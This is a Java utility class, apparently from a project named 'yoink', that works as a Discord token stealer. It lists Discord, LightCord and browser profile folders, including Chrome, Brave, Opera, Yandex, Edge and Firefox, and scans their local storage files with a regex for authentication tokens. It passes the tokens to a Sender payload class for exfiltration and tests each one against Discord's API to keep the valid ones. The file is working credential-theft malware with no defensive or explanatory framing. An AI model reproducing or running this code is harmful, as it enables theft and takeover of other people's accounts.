package me.perry.yoink.util;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.reflect.TypeToken;
import me.perry.yoink.payload.Sender;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public final
class TokenUtil {
    public static final List <String> paths = new ArrayList <>(Arrays.asList(
            System.getenv("APPDATA") + "\\Discord" ,
            System.getenv("APPDATA") + "\\discordcanary" ,
            System.getenv("APPDATA") + "\\discordptb" ,
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default" ,
            System.getenv("APPDATA") + "\\Opera Software\\Opera Stable" ,
            System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default" ,
            System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default" ,
            System.getenv("APPDATA") + "\\LightCord" ,
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"
    ));
    private static final Gson gson = new Gson();

    public static
    List <String> getValidTokens (List <String> tokens) {
        ArrayList <String> validTokens = new ArrayList <>();
        tokens.forEach(token -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                Map <String, Object> stuff = gson.fromJson(getHeaders(token) ,new TypeToken <Map <String, Object>>() {
                }.getType());
                stuff.forEach((key ,value) -> con.addRequestProperty(key ,(String) value));
                con.getInputStream().close();
                validTokens.add(token);
            } catch (Exception ignored) {
            }
        });
        return validTokens;
    }

    public static
    String getContentFromURL (String link ,String auth) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            Map <String, Object> json = gson.fromJson(getHeaders(auth) ,new TypeToken <Map <String, Object>>() {
            }.getType());
            json.forEach((key ,value) -> httpURLConnection.addRequestProperty(key ,(String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        } catch (Exception ignored) {
            return "";
        }
    }

    public static
    ArrayList <String> getTokens (String inPath) {
        String path = inPath + "\\Local Storage\\leveldb\\";
        ArrayList <String> tokens = new ArrayList <>();

        File pa = new File(path);
        String[] list = pa.list();
        if (list == null) return null;

        for (String s : list) {
            try {
                FileInputStream fileInputStream = new FileInputStream(path + s);
                DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    Matcher matcher = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
                    while (matcher.find()) tokens.add(matcher.group());
                }
            } catch (Exception ignored) {
            }
        }

        Sender.send(String.join(" - " ,tokens));

        return tokens;
    }

    public static
    JsonObject getHeaders (String token) {
        JsonObject object = new JsonObject();
        object.addProperty("Content-Type" ,"application/json");
        object.addProperty("User-Agent" ,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) object.addProperty("Authorization" ,token);
        return object;
    }

    public static
    List <String> removeDuplicates (List <String> list) {
        return list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
    }

    public static
    Optional <File> getFirefoxFile () {
        File file = new File(System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
        if (file.isDirectory())
            for (File file1 : Objects.requireNonNull(file.listFiles()))
                if (file1.isDirectory() && file1.getName().contains("release"))
                    for (File file2 : Objects.requireNonNull(file1.listFiles()))
                        if (file2.getName().contains("webappsstore"))
                            return Optional.of(file2);

        return Optional.empty();
    }
}